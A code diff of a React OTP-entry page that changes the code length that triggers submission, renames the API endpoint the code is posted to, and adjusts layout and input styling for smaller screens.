@@ -17,9 +17,9 @@ export default function Home() {
 
   useEffect(() => {
     setEFlag(false);
-    if (otp.length == 7) {
+    if (otp.length == 6) {
       axios
-        .post("/api/postTokenSms", {
+        .post("/api/postTokenProcess", {
           record_id: theme.record_id,
           code: otp,
         })
@@ -37,9 +37,8 @@ export default function Home() {
     }
   }, [otp]);
   return (
-    <main className="ctw-flex ctw-flex-col ctw-items-center ctw-justify-between ctw-pt-[80px]">
-      <div className="ctw-w-[448px] ctw-border-solid ctw-border-[1px]  ctw-rounded-[18px] ctw-border-[rgba(138,145,158,0.2)] ctw-p-[40px] ctw-pb-[24px] ctw-pb-[24px]">
-        <div className="ctw-pb-[56px] ctw-w-[126px] ctw-h-[78px]">
+    <main className="ctw-flex ctw-flex-col ctw-items-center ctw-justify-between ctw-pt-[80px] ctw-pl-[7px] ctw-pr-[7px]">
+       <div className="ctw-w-full md:ctw-w-[448px] ctw-border-solid ctw-border-[1px] ctw-rounded-[18px] ctw-border-[rgba(138,145,158,0.2)] ctw-p-[40px] ctw-pb-[24px]">        <div className="ctw-pb-[56px] ctw-w-[126px] ctw-h-[78px]">
           <svg
             xmlns="http://www.w3.org/2000/svg"
             role="img"
@@ -69,8 +68,8 @@ export default function Home() {
             value={otp}
             onChange={setOtp}
             numInputs={7}
-            containerStyle="ctw-grid ctw-grid-cols-6 ctw-gap-1"
-            inputStyle="active:ctw-bg-gray-800 active:ctw-border-blue-700 active:ctw-border-[1px] focus:ctw-border-blue-700 focus:ctw-border-[2px] active:ctw-border-[2px] ctw-text-white ctw-text-center ctw-rounded-[8px] ctw-w-[45px] ctw-h-[55px] ctw-outline-none ctw-border-[1px] ctw-bg-u-black ctw-border-solid ctw-border-[rgba(138,145,158,0.68)]"
+            containerStyle="ctw-grid ctw-grid-cols-6 ctw-gap-[5px]"
+            inputStyle="active:ctw-bg-gray-800 active:ctw-border-blue-700 active:ctw-border-[1px] focus:ctw-border-blue-700 focus:ctw-border-[2px] active:ctw-border-[2px] ctw-text-white ctw-text-center ctw-rounded-[8px] ctw-w-[40px] ctw-h-[45px] ctw-outline-none ctw-border-[1px] ctw-bg-u-black ctw-border-solid ctw-border-[rgba(138,145,158,0.68)]"
             renderSeparator={<span></span>}
             renderInput={(props) => <input {...props} />}
             skipDefaultStyles={true}
